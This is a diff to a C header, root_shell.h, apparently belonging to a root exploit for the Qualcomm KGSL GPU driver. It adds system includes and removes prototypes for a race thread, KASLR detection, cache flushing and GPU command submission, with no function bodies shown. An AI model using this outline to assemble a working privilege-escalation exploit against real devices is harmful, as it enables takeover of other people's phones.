@@ -1,9 +1,28 @@
 #ifndef ROOT_SHELL_H
 #define ROOT_SHELL_H
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <stdint.h>
 #include <stdbool.h>
-#include <sys/types.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <pthread.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sched.h>
+#include <sys/prctl.h>
+#include <signal.h>
+#include <sys/syscall.h>
+#include <linux/perf_event.h>
+#include <asm/unistd.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <sys/select.h>
+#include <poll.h>
+#include <sys/stat.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -80,28 +99,5 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define CP_WAIT_MEM_WRITES 0x12
 #define CP_EVENT_WRITE 0x46
 #define CACHE_FLUSH_TS 0x1C
-
-extern int kgsl_fd;
-extern volatile int race_done;
-extern volatile int dc_civac_works;
-
-void sigill_handler(int sig);
-void try_dc_civac(void *addr);
-void flush_dc_civac_range(void *start, size_t len);
-void die(const char *msg);
-long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags);
-uint64_t detect_kaslr(void);
-int gpuobj_alloc(int fd, uint64_t size, uint64_t flags);
-void *gpuobj_mmap(int fd, size_t size, unsigned int id);
-int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr, uint64_t *flags);
-void gpuobj_free(int fd, unsigned int id);
-unsigned int create_context(int fd);
-int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
-uint32_t pm4_parity(uint32_t v);
-uint32_t cp_type7(uint32_t opcode, uint32_t cnt);
-void split64(uint64_t addr, uint32_t *lo, uint32_t *hi);
-int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr, size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts);
-void *race_thread(void *arg);
-int main(int argc, char **argv);
 
 #endif
